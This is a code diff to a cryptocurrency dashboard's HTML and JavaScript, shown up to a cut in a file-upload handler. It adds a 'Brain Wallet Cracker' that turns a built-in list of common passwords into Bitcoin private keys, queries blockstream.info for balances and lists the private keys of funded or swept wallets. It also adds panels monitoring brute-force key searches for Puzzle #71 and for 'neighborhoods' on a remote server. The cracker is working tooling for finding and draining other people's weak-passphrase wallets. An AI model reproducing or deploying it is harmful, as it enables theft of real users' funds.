@@ -146,6 +146,62 @@
   .method-dot.nodata { background: var(--fg-dim); }
   .balance-find-card { border-color: var(--orange) !important; box-shadow: 0 0 12px rgba(251, 146, 60, 0.15); }
 
+  .p71-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.75rem; margin-bottom: 0.75rem; }
+  .p71-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.625rem; }
+  .p71-title { font-size: 0.8125rem; font-weight: 600; color: var(--fg); display: flex; align-items: center; gap: 0.5rem; }
+  .p71-badge { font-size: 0.625rem; padding: 0.125rem 0.5rem; border-radius: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.04em; }
+  .p71-badge.online { background: color-mix(in srgb, var(--green) 15%, transparent); color: var(--green); }
+  .p71-badge.offline { background: color-mix(in srgb, var(--red) 15%, transparent); color: var(--red); }
+  .p71-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 0.5rem 1rem; margin-bottom: 0.625rem; }
+  .p71-stat { font-size: 0.6875rem; color: var(--fg-dim); }
+  .p71-stat strong { color: var(--fg); font-variant-numeric: tabular-nums; display: block; font-size: 0.8125rem; margin-top: 0.125rem; }
+  .p71-stat strong.highlight { color: var(--accent); }
+  .p71-progress { height: 4px; background: var(--border); border-radius: 2px; overflow: hidden; margin-bottom: 0.5rem; }
+  .p71-progress-bar { height: 100%; background: var(--accent); border-radius: 2px; transition: width 1s ease; min-width: 1px; }
+  .p71-blocks { display: flex; gap: 0.75rem; font-size: 0.6875rem; color: var(--fg-dim); flex-wrap: wrap; }
+  .p71-blocks span strong { color: var(--fg); }
+  .p71-events { margin-top: 0.5rem; font-family: var(--font-mono); font-size: 0.625rem; color: var(--fg-dim); max-height: 60px; overflow-y: auto; line-height: 1.6; }
+  .p71-events .ev-warn { color: var(--orange); }
+  .p71-events .ev-error { color: var(--red); }
+  .p71-events .ev-found { color: var(--green); font-weight: 600; }
+  .p71-found { border-color: var(--green) !important; box-shadow: 0 0 20px rgba(74, 222, 128, 0.25); }
+
+  .bw-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 0.75rem; margin-bottom: 0.75rem; }
+  .bw-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.625rem; flex-wrap: wrap; gap: 0.5rem; }
+  .bw-title { font-size: 0.8125rem; font-weight: 600; color: var(--fg); display: flex; align-items: center; gap: 0.5rem; }
+  .bw-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 0.5rem 1rem; margin-bottom: 0.625rem; }
+  .bw-stat { font-size: 0.6875rem; color: var(--fg-dim); }
+  .bw-stat strong { color: var(--fg); font-variant-numeric: tabular-nums; display: block; font-size: 0.8125rem; margin-top: 0.125rem; }
+  .bw-stat strong.bw-found { color: var(--green); }
+  .bw-phrases { margin-top: 0.5rem; }
+  .bw-phrases textarea { width: 100%; height: 80px; background: var(--bg); color: var(--fg); border: 1px solid var(--border); border-radius: 6px; padding: 0.5rem; font-family: var(--font-mono); font-size: 0.6875rem; resize: vertical; box-sizing: border-box; }
+  .bw-phrases .bw-actions { display: flex; gap: 0.5rem; margin-top: 0.375rem; align-items: center; flex-wrap: wrap; }
+  .bw-hits { margin-top: 0.5rem; font-family: var(--font-mono); font-size: 0.625rem; color: var(--fg-dim); max-height: 120px; overflow-y: auto; line-height: 1.6; }
+  .bw-hits .hit { color: var(--orange); }
+  .bw-hits .hit-bal { color: var(--green); font-weight: 600; }
+  .bw-results-table { width: 100%; border-collapse: collapse; font-size: 0.625rem; margin-top: 0.5rem; }
+  .bw-results-table th { text-align: left; padding: 0.375rem 0.5rem; border-bottom: 1px solid var(--border); color: var(--fg-dim); font-weight: 600; position: sticky; top: 0; background: var(--surface); }
+  .bw-results-table td { padding: 0.25rem 0.5rem; border-bottom: 1px solid color-mix(in srgb, var(--border) 50%, transparent); word-break: break-all; }
+  .bw-results-table tr:hover { background: color-mix(in srgb, var(--accent) 5%, transparent); }
+  .bw-results-table .bal-live { color: var(--green); font-weight: 700; }
+  .bw-results-table .bal-swept { color: var(--fg-dim); }
+  .bw-results-wrap { border: 1px solid var(--border); border-radius: 6px; margin-top: 0.5rem; }
+  .bw-results-scroll { max-height: 350px; overflow-y: auto; }
+  .bw-filters { display: flex; gap: 0.375rem; margin-top: 0.5rem; flex-wrap: wrap; align-items: center; }
+  .bw-filters button { padding: 0.1875rem 0.5rem; font-size: 0.625rem; border-radius: 10px; border: 1px solid var(--border); background: var(--bg); color: var(--fg-dim); cursor: pointer; }
+  .bw-filters button.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .bw-filters .bw-count { font-size: 0.6rem; color: var(--fg-dim); margin-left: auto; }
+  .bw-pagination { display: flex; align-items: center; justify-content: center; gap: 0.375rem; padding: 0.375rem; border-top: 1px solid var(--border); background: var(--surface); }
+  .bw-pagination button { padding: 0.125rem 0.5rem; font-size: 0.625rem; border-radius: 4px; border: 1px solid var(--border); background: var(--bg); color: var(--fg-dim); cursor: pointer; min-width: 1.5rem; }
+  .bw-pagination button:hover:not(:disabled) { background: var(--surface-hover); color: var(--fg); }
+  .bw-pagination button.active { background: var(--accent); color: #fff; border-color: var(--accent); }
+  .bw-pagination button:disabled { opacity: 0.3; cursor: not-allowed; }
+  .bw-pagination .bw-page-info { font-size: 0.6rem; color: var(--fg-dim); }
+  .bw-copy-btn { cursor: pointer; opacity: 0.5; }
+  .bw-copy-btn:hover { opacity: 1; }
+  .bw-live-dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; background: var(--green); margin-right: 0.25rem; animation: bwPulse 2s infinite; }
+  @keyframes bwPulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
   .empty-state { text-align: center; color: var(--fg-dim); padding: 3rem 1rem; font-size: 0.9375rem; }
 
   .server-status { display: flex; align-items: center; gap: 0.5rem; font-size: 0.75rem; color: var(--fg-dim); padding: 0.5rem 0.75rem; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 0.75rem; }
@@ -229,8 +285,105 @@
         <span>Total checked: <strong id="totalChecked" style="color:var(--fg)">0</strong></span>
       </div>
     </div>
+    <div class="p71-card" id="p71Card">
+      <div class="p71-header">
+        <div class="p71-title">
+          Puzzle #71 Dedicated Search
+          <span class="p71-badge offline" id="p71Badge">offline</span>
+        </div>
+        <span style="font-size:0.6875rem;color:var(--fg-dim);cursor:pointer;text-decoration:underline dotted;" id="p71Uptime" title="Click to change tunnel URL" onclick="changeP71Url()"></span>
+      </div>
+      <div class="p71-progress"><div class="p71-progress-bar" id="p71ProgressBar" style="width:0%"></div></div>
+      <div class="p71-grid" id="p71Grid">
+        <div class="p71-stat">Coverage<strong id="p71Coverage">—</strong></div>
+        <div class="p71-stat">Keys Scanned<strong id="p71Keys">—</strong></div>
+        <div class="p71-stat">Speed<strong id="p71Speed">—</strong></div>
+        <div class="p71-stat">ETA (full range)<strong id="p71Eta">—</strong></div>
+        <div class="p71-stat">Blocks Done<strong id="p71Blocks">—</strong></div>
+        <div class="p71-stat">Workers<strong id="p71Workers">—</strong></div>
+      </div>
+      <div class="p71-blocks" id="p71ActiveBlocks"></div>
+      <div class="p71-events" id="p71Events"></div>
+    </div>
+
+    <div class="p71-card" id="nbCard" style="border-color:#6c5ce7;">
+      <div class="p71-header">
+        <div class="p71-title" style="color:#a29bfe;">
+          Neighborhood Brute-Force
+          <span class="p71-badge offline" id="nbBadge">offline</span>
+        </div>
+        <span style="font-size:0.6875rem;color:var(--fg-dim);" id="nbPhase"></span>
+      </div>
+      <div class="p71-progress"><div class="p71-progress-bar" id="nbProgressBar" style="width:0%;background:#6c5ce7;"></div></div>
+      <div class="p71-grid" id="nbGrid">
+        <div class="p71-stat">Neighborhoods<strong id="nbDone">0/0</strong></div>
+        <div class="p71-stat">Keys Scanned<strong id="nbKeys">—</strong></div>
+        <div class="p71-stat">Speed<strong id="nbSpeed">—</strong></div>
+        <div class="p71-stat">Current<strong id="nbCurrent">—</strong></div>
+        <div class="p71-stat">Progress<strong id="nbPct">—</strong></div>
+        <div class="p71-stat">ETA<strong id="nbEta">—</strong></div>
+        <div class="p71-stat">Uptime<strong id="nbUptime">—</strong></div>
+        <div class="p71-stat">Threads<strong id="nbThreads">—</strong></div>
+      </div>
+      <div class="p71-events" id="nbVanityKeys" style="font-size:0.6rem;color:var(--fg-dim);max-height:3rem;overflow:hidden;"></div>
+    </div>
+
+    <div class="bw-card" id="bwCard">
+      <div class="bw-header">
+        <div class="bw-title">
+          Brain Wallet Cracker
+          <span class="p71-badge offline" id="bwBadge">idle</span>
+        </div>
+        <span style="font-size:0.6875rem;color:var(--fg-dim);cursor:pointer;text-decoration:underline dotted;" id="bwApiUrl" title="Click to change API URL" onclick="changeBwUrl()"></span>
+      </div>
+      <div class="bw-grid" id="bwGrid">
+        <div class="bw-stat">Phrases Tested<strong id="bwTested">0</strong></div>
+        <div class="bw-stat">Hits (Activity)<strong id="bwHits">0</strong></div>
+        <div class="bw-stat">With Balance<strong id="bwWithBal">0</strong></div>
+        <div class="bw-stat">Speed<strong id="bwSpeed">—</strong></div>
+        <div class="bw-stat">Swept BTC<strong id="bwSwept">—</strong></div>
+      </div>
+      <div class="bw-phrases">
+        <textarea id="bwPhraseInput" placeholder="Enter phrases to test (one per line)...&#10;password&#10;correct horse battery staple&#10;my secret phrase"></textarea>
+        <div class="bw-actions">
+          <button class="btn btn-secondary" onclick="bwStartLocal()" style="padding:0.25rem 0.625rem;font-size:0.6875rem;" id="bwRunBtn">Run Locally</button>
+          <button class="btn btn-secondary" onclick="bwSendToServer()" style="padding:0.25rem 0.625rem;font-size:0.6875rem;">Send to Server</button>
+          <button class="btn btn-secondary" onclick="bwLoadDefaults()" style="padding:0.25rem 0.625rem;font-size:0.6875rem;">Load Defaults</button>
+          <button class="btn btn-secondary" onclick="document.getElementById('bwFileInput').click()" style="padding:0.25rem 0.625rem;font-size:0.6875rem;">Upload File</button>
+          <input type="file" id="bwFileInput" accept=".txt,.csv,.list,.wordlist" style="display:none;" onchange="bwHandleFileUpload(event)" multiple>
+          <span style="font-size:0.625rem;color:var(--fg-dim);" id="bwStatus"></span>
+        </div>
+        <div id="bwUploadProgress" style="display:none;margin-top:0.25rem;">
+          <div style="font-size:0.625rem;color:var(--fg-dim);">
+            <span id="bwUploadInfo"></span>
+            <div style="background:var(--bg-card);border-radius:2px;height:4px;margin-top:2px;overflow:hidden;">
+              <div id="bwUploadBar" style="height:100%;background:var(--accent);width:0%;transition:width 0.3s;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="bw-hits" id="bwHitsList"></div>
+      <div class="bw-filters" id="bwFilters" style="display:none;">
+        <button class="active" onclick="bwFilter('all')">All</button>
+        <button onclick="bwFilter('balance')">With Balance</button>
+        <button onclick="bwFilter('swept')">Swept</button>
+        <button onclick="bwFilter('high')">High Value (&gt;0.01 BTC)</button>
+        <span class="bw-count" id="bwFilterCount"></span>
+      </div>
+      <div class="bw-results-wrap" id="bwResultsWrap" style="display:none;">
+        <div class="bw-results-scroll">
+          <table class="bw-results-table">
+            <thead><tr><th>Phrase</th><th>Address</th><th>Private Key</th><th>Current</th><th>Lifetime</th><th>TXs</th></tr></thead>
+            <tbody id="bwResultsBody"></tbody>
+            <tfoot id="bwResultsFoot"></tfoot>
+          </table>
+        </div>
+        <div class="bw-pagination" id="bwPagination"></div>
+      </div>
+    </div>
+
     <div class="phrases" id="puzzleList">
-      <div class="empty-state">Server searches 24/7 with 3 algorithms. Click "+ Browser" for extra coverage.</div>
+      <div class="empty-state">Server searches 24/7. Puzzle #71 dedicated search runs on a separate VPS.</div>
     </div>
   </div>
 </div>
@@ -890,6 +1043,16 @@ async function generateBatch() {
     const mnemonic = await generateMnemonic();
     const addrs = await deriveAllAddresses(mnemonic);
 
+    // Check every BTC address against puzzle list
+    for (const c of BTC_CHAINS) {
+      const a = addrs[c.id];
+      if (a && PUZZLE_ADDRS.has(a)) {
+        const p = PUZZLE_ADDRS.get(a);
+        bigAlert(`PUZZLE #${p.n} HIT!`, `${p.btc} BTC — mnemonic: ${mnemonic}`);
+        savePuzzleHit(p.n, p.btc, mnemonic, a);
+      }
+    }
+
     const card = document.createElement('div');
     card.className = 'phrase-card';
     card.style.animationDelay = `${i * 0.05}s`;
@@ -1163,9 +1326,38 @@ let puzzleSpeedInterval = null;
 let puzzleKeysThisSecond = 0;
 let puzzleKeysLastSec = 0;
 
-const PUZZLE_LIST = [...PUZZLE_ADDRS.entries()].map(([addr, info]) => ({
-  address: addr, num: info.n, btc: info.btc, bits: info.n
-}));
+// Decode Base58Check address → 20-byte Hash160
+function base58Decode(addr) {
+  const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let num = 0n;
+  for (const c of addr) num = num * 58n + BigInt(A.indexOf(c));
+  let hex = num.toString(16);
+  if (hex.length % 2) hex = '0' + hex;
+  const bytes = [];
+  for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.slice(i, i+2), 16));
+  let leadingZeros = 0;
+  for (const c of addr) { if (c === '1') leadingZeros++; else break; }
+  const full = new Uint8Array(leadingZeros + bytes.length);
+  full.set(bytes, leadingZeros);
+  return full.slice(1, 21);
+}
+
+// Pre-decode all puzzle addresses to Hash160 hex for fast lookup
+const PUZZLE_HASH160_MAP = new Map(); // hash160hex → {n, btc, address}
+const PUZZLE_HASH160_SET = new Set();
+const PUZZLE_BY_BITS = new Map(); // bits → [{n, btc, address, hash160hex}]
+
+for (const [addr, info] of PUZZLE_ADDRS) {
+  const h160 = base58Decode(addr);
+  const hex = Array.from(h160).map(b => b.toString(16).padStart(2, '0')).join('');
+  PUZZLE_HASH160_MAP.set(hex, { n: info.n, btc: info.btc, address: addr });
+  PUZZLE_HASH160_SET.add(hex);
+  const bits = info.n;
+  if (!PUZZLE_BY_BITS.has(bits)) PUZZLE_BY_BITS.set(bits, []);
+  PUZZLE_BY_BITS.get(bits).push({ n: info.n, btc: info.btc, address: addr, hash160hex: hex });
+}
+
+const PUZZLE_BITS_LIST = [...PUZZLE_BY_BITS.keys()];
 
 function randomKeyInRange(bits) {
   const key = new Uint8Array(32);
@@ -1183,28 +1375,31 @@ function randomKeyInRange(bits) {
   return key;
 }
 
-async function privateKeyToAddress(keyBytes) {
+// Fast: privkey → Hash160 (skip Base58Check entirely)
+async function privateKeyToHash160(keyBytes) {
   const hex = '0x' + Array.from(keyBytes).map(b => b.toString(16).padStart(2, '0')).join('');
   const signingKey = new ethers.utils.SigningKey(hex);
   const compPub = ethers.utils.arrayify(signingKey.compressedPublicKey);
   const s = new Uint8Array(await sha256(compPub));
-  return await base58Check(0x00, ripemd160(s));
+  const h160 = ripemd160(s);
+  return Array.from(h160).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
 async function puzzleSearchBatch() {
   if (!puzzleSearching) return;
-  const BATCH = 20;
+  const BATCH = 50;
   for (let i = 0; i < BATCH; i++) {
-    const puzzle = PUZZLE_LIST[Math.floor(Math.random() * PUZZLE_LIST.length)];
-    const key = randomKeyInRange(puzzle.bits);
-    const addr = await privateKeyToAddress(key);
+    const bits = PUZZLE_BITS_LIST[Math.floor(Math.random() * PUZZLE_BITS_LIST.length)];
+    const key = randomKeyInRange(bits);
+    const h160hex = await privateKeyToHash160(key);
     puzzleCheckedCount++;
     puzzleKeysThisSecond++;
 
-    if (addr === puzzle.address) {
+    if (PUZZLE_HASH160_SET.has(h160hex)) {
+      const puzzle = PUZZLE_HASH160_MAP.get(h160hex);
       const keyHex = Array.from(key).map(b => b.toString(16).padStart(2, '0')).join('');
-      bigAlert(`PUZZLE #${puzzle.num} SOLVED!`, `${puzzle.btc} BTC found! Private key: ${keyHex.slice(0,20)}...`);
-      savePuzzleHit(puzzle.num, puzzle.btc, keyHex, puzzle.address);
+      bigAlert(`PUZZLE #${puzzle.n} SOLVED!`, `${puzzle.btc} BTC found! Private key: ${keyHex.slice(0,20)}...`);
+      savePuzzleHit(puzzle.n, puzzle.btc, keyHex, puzzle.address);
     }
   }
   setTimeout(puzzleSearchBatch, 0);
@@ -1496,6 +1691,523 @@ function mergeBalanceFind(f) {
   try { localStorage.setItem(BAL_FIND_KEY, JSON.stringify(finds)); } catch {}
   if (!document.getElementById('puzzlesTab').hidden) renderPuzzleTab();
 }
+
+// ── Puzzle #71 dedicated search integration ──
+
+const P71_DEFAULT_API = 'https://wagerone-java-wrapper.bluestufftech.com/api/stats';
+let p71TunnelUrl = localStorage.getItem('p71_tunnel_url') || P71_DEFAULT_API;
+
+function changeP71Url() {
+  const url = prompt('Enter puzzle #71 stats API URL:', p71TunnelUrl.replace('/api/stats', ''));
+  if (!url) return;
+  p71TunnelUrl = url.replace(/\/+$/, '') + '/api/stats';
+  try { localStorage.setItem('p71_tunnel_url', p71TunnelUrl); } catch {}
+  fetchP71Stats();
+}
+
+function fmtBig(n) {
+  if (n >= 1e18) return (n / 1e18).toFixed(2) + ' E';
+  if (n >= 1e15) return (n / 1e15).toFixed(2) + ' P';
+  if (n >= 1e12) return (n / 1e12).toFixed(2) + ' T';
+  if (n >= 1e9) return (n / 1e9).toFixed(2) + ' B';
+  if (n >= 1e6) return (n / 1e6).toFixed(2) + ' M';
+  if (n >= 1e3) return (n / 1e3).toFixed(1) + ' K';
+  return n.toFixed(0);
+}
+
+function fmtRate(n) {
+  if (n >= 1e6) return (n / 1e6).toFixed(1) + ' MK/s';
+  if (n >= 1e3) return (n / 1e3).toFixed(1) + ' KK/s';
+  return n.toFixed(0) + ' K/s';
+}
+
+async function fetchP71Stats() {
+  const badge = document.getElementById('p71Badge');
+  try {
+    const r = await fetch(p71TunnelUrl, { signal: AbortSignal.timeout(15000), headers: { 'Bypass-Tunnel-Reminder': 'true' } });
+    if (!r.ok) throw new Error(r.status);
+    const s = await r.json();
+
+    if (s.public_urls && s.public_urls.length) {
+      p71TunnelUrl = s.public_urls[0] + '/api/stats';
+    }
+
+    badge.textContent = s.running ? 'running' : 'stopped';
+    badge.className = 'p71-badge ' + (s.running ? 'online' : 'offline');
+
+    if (s.found) {
+      badge.textContent = 'KEY FOUND!';
+      badge.className = 'p71-badge online';
+      document.getElementById('p71Card').classList.add('p71-found');
+    }
+
+    const el = id => document.getElementById(id);
+
+    if (s.elapsed_hours != null) {
+      const h = s.elapsed_hours;
+      const days = Math.floor(h / 24);
+      const hrs = Math.floor(h % 24);
+      el('p71Uptime').textContent = days > 0 ? `${days}d ${hrs}h running` : `${hrs}h running`;
+    }
+
+    el('p71Coverage').textContent = s.coverage_percent != null ? s.coverage_percent.toFixed(8) + '%' : '—';
+    el('p71Keys').textContent = s.keys_scanned != null ? fmtBig(s.keys_scanned) : '—';
+
+    const rate = s.throughput_1h_keys_s || s.throughput_overall_keys_s || 0;
+    el('p71Speed').textContent = rate > 0 ? fmtRate(rate) : '—';
+    el('p71Speed').className = rate > 0 ? 'highlight' : '';
+
+    if (s.eta_full_range_years != null) {
+      const y = s.eta_full_range_years;
+      el('p71Eta').textContent = y > 1000 ? fmtBig(y) + ' years' : y.toFixed(1) + ' years';
+    } else {
+      el('p71Eta').textContent = '—';
+    }
+
+    el('p71Blocks').textContent = s.blocks_done != null ? s.blocks_done.toLocaleString() : '—';
+    el('p71Workers').textContent = s.workers ? s.workers.length + ' x ' + (s.threads_per_worker || '?') + ' threads' : '—';
+
+    const pct = s.coverage_percent || 0;
+    el('p71ProgressBar').style.width = Math.max(pct, 0.01) + '%';
+
+    const ab = document.getElementById('p71ActiveBlocks');
+    if (s.active_blocks && s.active_blocks.length) {
+      ab.innerHTML = s.active_blocks.map(b =>
+        `<span>${b.lane} #${b.idx} <strong>${b.worker}</strong> (${Math.floor(b.running_min)}m)</span>`
+      ).join('');
+    } else {
+      ab.innerHTML = '<span>No active blocks</span>';
+    }
+
+    const ev = document.getElementById('p71Events');
+    if (s.events && s.events.length) {
+      ev.innerHTML = s.events.slice(0, 5).map(e => {
+        const cls = e.level === 'WARN' ? 'ev-warn' : e.level === 'ERROR' ? 'ev-error' : e.level === 'FOUND' ? 'ev-found' : '';
+        return `<div class="${cls}">${e.utc} ${e.msg}</div>`;
+      }).join('');
+    }
+
+  } catch (e) {
+    badge.textContent = 'offline';
+    badge.className = 'p71-badge offline';
+  }
+}
+
+fetchP71Stats();
+setInterval(fetchP71Stats, 30000);
+
+// ── Neighborhood Brute-Force ──
+
+async function fetchNbStats() {
+  const badge = document.getElementById('nbBadge');
+  try {
+    // Use same tunnel as p71 stats but /api/neighborhood path (proxied on port 8787)
+    const nbUrl = p71TunnelUrl.replace('/api/stats', '/api/neighborhood');
+    const r = await fetch(nbUrl, { signal: AbortSignal.timeout(10000), headers: { 'Bypass-Tunnel-Reminder': 'true' } });
+    if (!r.ok) throw new Error(r.status);
+    const s = await r.json();
+    if (s.error) throw new Error(s.error);
+
+    badge.textContent = s.running ? 'running' : 'stopped';
+    badge.className = 'p71-badge ' + (s.running ? 'online' : 'offline');
+
+    if (s.found) {
+      badge.textContent = 'KEY FOUND!';
+      badge.className = 'p71-badge online';
+      document.getElementById('nbCard').style.borderColor = '#5fd38d';
+    }
+
+    const el = id => document.getElementById(id);
+    el('nbPhase').textContent = s.phase || '';
+    el('nbDone').textContent = `${s.neighborhoods_done}/${s.neighborhoods_total}`;
+    el('nbKeys').textContent = s.keys_scanned > 0 ? fmtBig(s.keys_scanned) : '—';
+    el('nbSpeed').textContent = s.current_rate_keys_s > 0 ? fmtRate(s.current_rate_keys_s) : '—';
+    el('nbCurrent').textContent = s.current_neighborhood || '—';
+    el('nbThreads').textContent = s.threads || '—';
+
+    if (s.elapsed_hours != null) {
+      const h = s.elapsed_hours;
+      const days = Math.floor(h / 24);
+      const hrs = Math.floor(h % 24);
+      el('nbUptime').textContent = days > 0 ? `${days}d ${hrs}h` : `${hrs}h ${Math.floor((h % 1) * 60)}m`;
+    }
+
+    const pct = parseFloat(s.neighborhoods_progress_pct) || 0;
+    el('nbPct').textContent = pct.toFixed(2) + '%';
+    el('nbProgressBar').style.width = Math.max(pct, 0.1) + '%';
+
+    if (s.elapsed_hours > 0 && pct > 0) {
+      const totalHrs = s.elapsed_hours / (pct / 100);
+      const remHrs = totalHrs - s.elapsed_hours;
+      if (remHrs > 24) {
+        const d = Math.floor(remHrs / 24), h = Math.floor(remHrs % 24);
+        el('nbEta').textContent = `${d}d ${h}h`;
+      } else if (remHrs > 1) {
+        el('nbEta').textContent = `${Math.floor(remHrs)}h ${Math.floor((remHrs % 1) * 60)}m`;
+      } else {
+        el('nbEta').textContent = `${Math.floor(remHrs * 60)}m`;
+      }
+    } else {
+      el('nbEta').textContent = 'calculating…';
+    }
+
+    if (s.vanity_keys && s.vanity_keys.length) {
+      el('nbVanityKeys').innerHTML = 'Vanity keys: ' + s.vanity_keys.map(v => `<span style="color:var(--accent)">${v.name}</span>=${v.hex.slice(0,10)}…`).join(', ');
+    }
+
+  } catch (e) {
+    badge.textContent = 'offline';
+    badge.className = 'p71-badge offline';
+  }
+}
+
+fetchNbStats();
+setInterval(fetchNbStats, 15000);
+
+// ── Brain Wallet Cracker ──
+
+const BW_DEFAULT_PHRASES = [
+  'password','password1','123456','bitcoin','satoshi',
+  'correct horse battery staple','i find your lack of faith disturbing',
+  'abc','test','hello','fuck','love','god','money','sex','secret',
+  'master','letmein','dragon','qwerty','to be or not to be',
+  'the quick brown fox jumps over the lazy dog','sausage','pass',
+  'blockchain','iloveyou','football','monkey','charlie','hello world',
+  'test123','password123','1','2','0','42','a','b','c','aaa',
+  'brainwallet','brain wallet','wallet','1234','asdf','the','cat','dog',
+  'i love you','may the force be with you','hodl','to the moon','',
+  'trustno1','sunshine','princess','shadow','freedom','whatever',
+  'nothing','private key','seed phrase','bitcoin wallet','crypto',
+  'ethereum','ripple','litecoin','dogecoin','solana','cardano',
+  'silk road','deep web','darknet','anonymous','tor','vpn',
+  'hack','hacker','admin','root','toor','administrator',
+  'welcome','welcome1','changeme','default','guest','user',
+  'login','access','temp','temporary','demo','sample'
+];
+
+const BW_API_DEFAULT = 'https://wagerone-java-wrapper.bluestufftech.com/api/brainwallet';
+let bwApiUrl = localStorage.getItem('bw_api_url') || BW_API_DEFAULT;
+let bwRunning = false;
+let bwLocalStats = { tested: 0, hits: 0, withBal: 0, swept: 0, startTime: 0 };
+
+function changeBwUrl() {
+  const url = prompt('Enter brain wallet API URL:', bwApiUrl.replace('/api/brainwallet', ''));
+  if (!url) return;
+  bwApiUrl = url.replace(/\/+$/, '') + '/api/brainwallet';
+  try { localStorage.setItem('bw_api_url', bwApiUrl); } catch {}
+}
+
+function bwLoadDefaults() {
+  document.getElementById('bwPhraseInput').value = BW_DEFAULT_PHRASES.join('\n');
+}
+
+async function bwCheckAddr(addr) {
+  try {
+    const r = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(10000) });
+    if (!r.ok) return { txCount: 0, balance: 0, funded: 0 };
+    const j = await r.json();
+    const funded = j.chain_stats?.funded_txo_sum || 0;
+    const spent = j.chain_stats?.spent_txo_sum || 0;
+    return { txCount: j.chain_stats?.tx_count || 0, balance: funded - spent, funded };
+  } catch { return { txCount: 0, balance: 0, funded: 0 }; }
+}
+
+function bwSha256(msg) {
+  const enc = new TextEncoder().encode(msg);
+  return crypto.subtle.digest('SHA-256', enc);
+}
+
+function bwRipemd160(data) {
+  return ethers.utils.ripemd160(data);
+}
+
+async function bwPhraseToAddrs(phrase) {
+  const hashBuf = await bwSha256(phrase);
+  const privKey = new Uint8Array(hashBuf);
+  const privHex = Array.from(privKey).map(b => b.toString(16).padStart(2, '0')).join('');
+  try {
+    const wallet = new ethers.utils.SigningKey('0x' + privHex);
+    const pubComp = wallet.compressedPublicKey;
+    const pubUncomp = wallet.publicKey;
+    const sha1 = ethers.utils.sha256(pubComp);
+    const ripe1 = bwRipemd160(sha1);
+    const sha2 = ethers.utils.sha256(pubUncomp);
+    const ripe2 = bwRipemd160(sha2);
+    return {
+      privHex,
+      addrComp: bwHash160ToAddr(ripe1),
+      addrUncomp: bwHash160ToAddr(ripe2)
+    };
+  } catch { return null; }
+}
+
+function bwHash160ToAddr(ripe160Hex) {
+  const versioned = '00' + ripe160Hex.slice(2);
+  const h1 = ethers.utils.sha256('0x' + versioned);
+  const h2 = ethers.utils.sha256(h1);
+  const checksum = h2.slice(2, 10);
+  const payload = versioned + checksum;
+  const bytes = [];
+  for (let i = 0; i < payload.length; i += 2) bytes.push(parseInt(payload.substr(i, 2), 16));
+  const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  let num = BigInt('0x' + payload);
+  let str = '';
+  while (num > 0n) { str = B58[Number(num % 58n)] + str; num /= 58n; }
+  for (const b of bytes) { if (b === 0) str = '1' + str; else break; }
+  return str;
+}
+
+async function bwStartLocal() {
+  if (bwRunning) { bwRunning = false; return; }
+  const input = document.getElementById('bwPhraseInput').value.trim();
+  if (!input) { bwLoadDefaults(); return; }
+  const phrases = input.split('\n').filter(l => l.length >= 0);
+  bwRunning = true;
+  bwLocalStats = { tested: 0, hits: 0, withBal: 0, swept: 0, startTime: Date.now() };
+  document.getElementById('bwRunBtn').textContent = 'Stop';
+  document.getElementById('bwBadge').textContent = 'running';
+  document.getElementById('bwBadge').className = 'p71-badge online';
+  const hitsList = document.getElementById('bwHitsList');
+  hitsList.innerHTML = '';
+
+  for (const phrase of phrases) {
+    if (!bwRunning) break;
+    const addrs = await bwPhraseToAddrs(phrase);
+    if (!addrs) { bwLocalStats.tested++; bwUpdateUI(); continue; }
+    const [r1, r2] = await Promise.all([bwCheckAddr(addrs.addrComp), bwCheckAddr(addrs.addrUncomp)]);
+    bwLocalStats.tested++;
+    const hasActivity = r1.txCount > 0 || r2.txCount > 0;
+    if (hasActivity) {
+      bwLocalStats.hits++;
+      const totalBal = r1.balance + r2.balance;
+      const totalFunded = r1.funded + r2.funded;
+      bwLocalStats.swept += totalFunded;
+      if (totalBal > 0) bwLocalStats.withBal++;
+      const cls = totalBal > 0 ? 'hit-bal' : 'hit';
+      hitsList.innerHTML = `<div class="${cls}">"${phrase || '&lt;empty&gt;'}" → ${totalBal > 0 ? 'BALANCE: ' + (totalBal/1e8).toFixed(8) + ' BTC!' : 'swept'} (${(totalFunded/1e8).toFixed(4)} BTC funded, ${r1.txCount + r2.txCount} txs)</div>` + hitsList.innerHTML;
+      bwAllResults.unshift({ phrase: phrase || '<empty>', privKey: addrs.privHex, addrComp: addrs.addrComp, addrUncomp: addrs.addrUncomp, balance: totalBal, funded: totalFunded, txCount: r1.txCount + r2.txCount });
+      bwRenderResults(bwAllResults);
+    }
+    document.getElementById('bwStatus').textContent = `[${bwLocalStats.tested}/${phrases.length}] "${(phrase || '<empty>').substring(0, 25)}"`;
+    bwUpdateUI();
+    await new Promise(r => setTimeout(r, 300));
+  }
+  bwRunning = false;
+  document.getElementById('bwRunBtn').textContent = 'Run Locally';
+  document.getElementById('bwBadge').textContent = bwLocalStats.hits > 0 ? `done (${bwLocalStats.hits} hits)` : 'done';
+  document.getElementById('bwBadge').className = 'p71-badge ' + (bwLocalStats.withBal > 0 ? 'online' : 'offline');
+  document.getElementById('bwStatus').textContent = 'Finished';
+}
+
+async function bwHandleFileUpload(event) {
+  const files = event.target.files;
+  if (!files.length) return;
+  const progressDiv = document.getElementById('bwUploadProgress');
+  const infoSpan = document.getElementById('bwUploadInfo');
+  const bar = document.getElementById('bwUploadBar');
+  progressDiv.style.display = 'block';
+
+  for (const file of files) {
+    infoSpan.textContent = `Reading ${file.name}...`;
+    bar.style.width = '0%';
+    const text = await file.text();
